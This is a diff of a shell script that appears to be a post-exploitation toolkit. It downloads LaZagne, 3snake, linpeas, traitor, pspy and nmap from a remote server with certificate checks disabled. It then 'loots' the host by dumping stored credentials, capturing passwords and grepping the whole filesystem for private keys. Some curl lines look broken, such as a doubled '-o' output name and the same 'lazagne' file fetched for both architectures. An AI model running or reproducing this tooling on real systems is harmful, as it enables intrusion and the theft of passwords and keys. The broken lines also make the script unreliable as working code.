@@ -61,30 +61,34 @@ download_tools() {
         wget --no-check-certificate -q "$server_url/tools/linpeas.sh"
         wget --no-check-certificate -q "$server_url/tools/les.sh"
         wget --no-check-certificate -q "$server_url/tools/nmap.tar"
-        wget --no-check-certificate -q "$server_url/tools/3snake"
-        wget --no-check-certificate -q "$server_url/tools/lazagne"
         if [ "$kernel_arch" == "x86_64" ] || [ "$kernel_arch" == "x64" ]
         then
             wget --no-check-certificate -q "$server_url/tools/traitor-amd64"
             wget --no-check-certificate -q "$server_url/tools/pspy64"
+            wget --no-check-certificate -q "$server_url/tools/lazagne64"
+            wget --no-check-certificate -q "$server_url/tools/3snake64"
         else
             wget --no-check-certificate -q "$server_url/tools/traitor-386"
             wget --no-check-certificate -q "$server_url/tools/pspy32"
+            wget --no-check-certificate -q "$server_url/tools/lazagne32"
+            wget --no-check-certificate -q "$server_url/tools/3snake32"
         fi
     elif [ "$curl_found" == 1 ]
     then
         curl -s -k "$server_url/tools/linpeas.sh" -o linpeas.sh
         curl -s -k "$server_url/tools/les.sh" -o les.sh
         curl -s -k "$server_url/tools/nmap.tar" -o nmap.tar
-        curl -s -k "$server_url/tools/3snake" -o 3snake
-        curl -s -k "$server_url/tools/lazagne" -o lazagne
         if [ "$kernel_arch" == "x86_64" ] || [ "$kernel_arch" == "x64" ]
         then
             curl -s -k "$server_url/tools/traitor-amd64" -o pspy64 traitor-amd64
             curl -s -k "$server_url/tools/pspy64" -o pspy64
+            curl -s -k "$server_url/tools/lazagne" -o lazagne64
+            curl -s -k "$server_url/tools/3snake64" -o 3snake64
         else
             curl -s -k "$server_url/tools/traitor-386" -o traitor-386
             curl -s -k "$server_url/tools/pspy32" -o pspy32
+            curl -s -k "$server_url/tools/lazagne" -o lazagne32
+            curl -s -k "$server_url/tools/3snake32" -o 3snake32
         fi
     fi
     tar -xf nmap.tar
@@ -95,8 +99,8 @@ download_tools() {
 looting() {
     cd blood || exit
     mkdir loot
-    ./lazagne all | tee -a loot/lazagne.txt
-    ./3snake -d -o ../loot/3snake.txt
+    ./lazagne* all | tee -a loot/lazagne.txt
+    ./3snake* -d -o ../loot/3snake.txt
     ./linpeas.sh -a | tee -a loot/linpeas.txt
     echo "======================= POSSIBLE PRIV KEYS:" | tee -a loot/priv_keys.txt
     grep -r -a "^-----BEGIN OPENSSH PRIVATE KEY-----$\|^-----BEGIN ENCRYPTED PRIVATE KEY-----$\|^-----BEGIN PRIVATE KEY-----$\|^-----BEGIN RSA PRIVATE KEY-----$" / 2>/dev/null | tee -a loot/priv_keys.txt
